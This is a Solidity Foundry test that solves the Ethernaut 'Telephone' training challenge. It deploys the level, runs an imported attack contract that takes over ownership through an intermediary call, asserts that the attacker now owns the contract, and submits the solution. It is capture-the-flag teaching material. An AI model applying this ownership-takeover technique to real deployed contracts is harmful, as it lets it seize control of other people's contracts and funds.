// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

// testing functionalities
import "forge-std/Test.sol";

// Ethernaut game components
import "src/levels/04-Telephone/TelephoneFactory.sol";
import "src/core/Ethernaut.sol";
import "src/levels/04-Telephone/TelephoneAttack.sol";

contract TelephoneTest is Test {
    /*//////////////////////////////////////////////////////////////
                            GAME INSTANCE SETUP
    //////////////////////////////////////////////////////////////*/

    Ethernaut ethernaut;

    address attacker = makeNameForAddress("attacker");

    function setUp() public {
        emit log_string("Setting up Telephone level...");
        ethernaut = new Ethernaut();
        // We need to give attacker some funds to attack the contract
        vm.deal(attacker, 10 wei);
    }

    /*//////////////////////////////////////////////////////////////
                LEVEL INSTANCE -> EXPLOIT -> SUBMISSION
    //////////////////////////////////////////////////////////////*/

    function testTelephoneExploit() public {
        /*//////////////////////////////////////////////////////////////
                            LEVEL INSTANCE SETUP
        //////////////////////////////////////////////////////////////*/

        TelephoneFactory telephoneFactory = new TelephoneFactory();

        ethernaut.registerLevel(telephoneFactory);
        vm.startPrank(attacker);

        address levelAddress = ethernaut.createLevelInstance(telephoneFactory);
        Telephone telephoneContract = Telephone(payable(levelAddress));

        emit log_named_address(
            "The original owner of the contract: ",
            telephoneContract.owner()
        );
        emit log_named_address(
            "Address of the exploit contract: ",
            address(this)
        );
        emit log_named_address("Attacker's address: ", address(attacker));
        emit log_named_uint("Balance of attacker (before): ", attacker.balance);
        emit log_named_uint(
            "Contract balance (before): ",
            address(telephoneContract).balance
        );

        /*//////////////////////////////////////////////////////////////
                                LEVEL EXPLOIT
        //////////////////////////////////////////////////////////////*/

        // Attacker creates the malicious contract with `attack()` function that makes a call to the `Telephone` contract
        TelephoneAttack telephoneAttack = new TelephoneAttack(levelAddress);

        emit log_named_address(
            "Owner of contract before attack: ",
            telephoneContract.owner()
        );

        // `attack()` function invokes the `changeOwner()` function with attacker's address as an argument
        emit log_string("Eve calls the attack function...");
        telephoneAttack.attack();

        // The ownership is claimed by attacker
        emit log_named_address(
            "Owner of contract after attack: ",
            telephoneContract.owner()
        );

        // Test assertion
        assertEq(telephoneContract.owner(), attacker);

        /*//////////////////////////////////////////////////////////////
                                LEVEL SUBMISSION
        //////////////////////////////////////////////////////////////*/

        bool challengeCompleted = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(challengeCompleted);
    }

    /*//////////////////////////////////////////////////////////////
                            HELPER FUNCTIONS
    //////////////////////////////////////////////////////////////*/

    /**
     * I've found this useful function
     * in github/twpony Ethernaut repo
     * @notice This function allows for creating labels (names) for addresses
     * which will improve readability in traces
     * @param name you pass the name like "alice" or "bob" and it will create
     * an address for that person
     */
    function makeNameForAddress(string memory name) public returns (address) {
        address addr = address(
            uint160(uint256(keccak256(abi.encodePacked(name))))
        );
        vm.label(addr, name);
        return addr;
    }
}
